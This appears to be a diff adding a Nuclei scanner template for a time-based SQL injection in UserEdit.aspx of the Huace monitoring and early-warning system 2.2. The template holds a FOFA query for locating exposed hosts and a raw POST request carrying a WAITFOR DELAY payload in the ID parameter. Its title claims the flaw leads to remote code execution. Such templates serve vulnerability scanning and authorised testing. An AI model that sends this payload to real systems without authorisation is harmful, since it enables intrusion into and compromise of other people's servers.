@@ -1,0 +1,33 @@
+id: huace-UserEdit-sqli
+
+info:
+  name: 华测监测预警系统2.2 UserEdit.aspx SQL注入致RCE
+  author: god
+  severity: high
+  description: 华测监测预警系统2.2 UserEdit.aspx SQL注入致RCE
+  metadata:
+    fofa-query: icon_hash="-628229493"
+  tags: huace,sqli
+  
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    POST /Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+        - type: dsl
+          dsl:
+            - 'duration>=3 && duration<5' 
+            - 'status_code_1 == 200'
+          condition: and
+
